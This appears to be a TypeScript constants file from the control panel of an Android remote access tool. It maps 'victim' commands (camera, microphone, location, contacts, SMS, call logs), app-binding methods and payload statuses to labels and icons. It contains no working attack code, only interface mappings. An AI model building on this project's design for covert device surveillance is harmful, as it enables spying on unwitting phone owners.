import { type IconDefinition } from '@fortawesome/free-brands-svg-icons';
import {
    faAddressBook,
    faCamera,
    faCircleCheck,
    faCircleExclamation,
    faCircleNotch,
    faCirclePause,
    faFolder,
    faMapLocationDot,
    faMessage,
    faMicrophone,
    faPhone,
} from '@fortawesome/free-solid-svg-icons';

import {
    BindingMethod,
    ConnectionStatus,
    PayloadLogStatus,
    PayloadStatus,
    VictimOrder,
} from '../../common/enums';
import BlockedCallIcon from '../assets/images/blocked-call.png';
import UnknownCallIcon from '../assets/images/call.png';
import RejectedCallIcon from '../assets/images/end-call.png';
import IncomingCallIcon from '../assets/images/incomming-call.png';
import MissedCallIcon from '../assets/images/missed-call.png';
import OutgoingCallIcon from '../assets/images/out-call.png';
import AnsweredExternallyCallIcon from '../assets/images/phone-ringing.png';
import VoicemailCallIcon from '../assets/images/voice-mail.png';

export const ConnectionStatusColorMap: Record<ConnectionStatus, string> = {
    [ConnectionStatus.CONNECTED]: 'var(--colorPaletteLightGreenForeground3)',
    [ConnectionStatus.DISCONNECTED]: 'var(--colorPalettePlatinumBorderActive)',
    [ConnectionStatus.ERROR]: 'var(--colorPaletteRedForeground3)',
    [ConnectionStatus.CONNECTING]: 'var(--colorBrandForegroundLink)',
};

export const ConnectionStatusTextMap: Record<ConnectionStatus, string> = {
    [ConnectionStatus.CONNECTED]: 'Connected',
    [ConnectionStatus.DISCONNECTED]: 'Disconnected',
    [ConnectionStatus.ERROR]: 'Error',
    [ConnectionStatus.CONNECTING]: 'Connecting',
};

export const AndroidCallTypeTextMap: Record<number, string> = {
    0: 'Unknown',
    1: 'Incoming',
    2: 'Outgoing',
    3: 'Missed',
    4: 'Voicemail',
    5: 'Rejected',
    6: 'Blocked',
    7: 'AnsweredExternally',
};

export const AndroidCallTypeIconMap: Record<number, string> = {
    0: UnknownCallIcon,
    1: IncomingCallIcon,
    2: OutgoingCallIcon,
    3: MissedCallIcon,
    4: VoicemailCallIcon,
    5: RejectedCallIcon,
    6: BlockedCallIcon,
    7: AnsweredExternallyCallIcon,
};

export const VictimOrderPermissionTextMap: Record<VictimOrder, string> = {
    [VictimOrder.CAMERA]: 'Camera',
    [VictimOrder.FILE_MANAGER]: 'Storage',
    [VictimOrder.MICROPHONE]: 'Microphone',
    [VictimOrder.LOCATION]: 'Location',
    [VictimOrder.CONTACTS]: 'Contacts',
    [VictimOrder.SMS]: 'SMS',
    [VictimOrder.CALLS]: 'Call Logs',
};

export const VictimOrderPermissionIconMap: Record<VictimOrder, IconDefinition> =
    {
        [VictimOrder.CAMERA]: faCamera,
        [VictimOrder.FILE_MANAGER]: faFolder,
        [VictimOrder.MICROPHONE]: faMicrophone,
        [VictimOrder.LOCATION]: faMapLocationDot,
        [VictimOrder.CONTACTS]: faAddressBook,
        [VictimOrder.SMS]: faMessage,
        [VictimOrder.CALLS]: faPhone,
    };

export const BindingMethodTextMap: Record<BindingMethod, string> = {
    [BindingMethod.BOOT]: 'Boot Method',
    [BindingMethod.ACTIVITY]: 'Activity Method',
};

export const BindingMethodWarningTextMap: Record<BindingMethod, string> = {
    [BindingMethod.BOOT]: 'Device restart is required',
    [BindingMethod.ACTIVITY]: "Doesn't work on all apps",
};

export const PayloadStatusIconMap: Record<PayloadStatus, IconDefinition> = {
    [PayloadStatus.PENDING]: faCirclePause,
    [PayloadStatus.INPROGRESS]: faCircleNotch,
    [PayloadStatus.SUCCESS]: faCircleCheck,
    [PayloadStatus.FAILED]: faCircleExclamation,
};

export const LogStatusIconMap: Record<PayloadLogStatus, IconDefinition> = {
    [PayloadLogStatus.INPROGRESS]: faCircleNotch,
    [PayloadLogStatus.SUCCESS]: faCircleCheck,
    [PayloadLogStatus.FAILED]: faCircleExclamation,
};
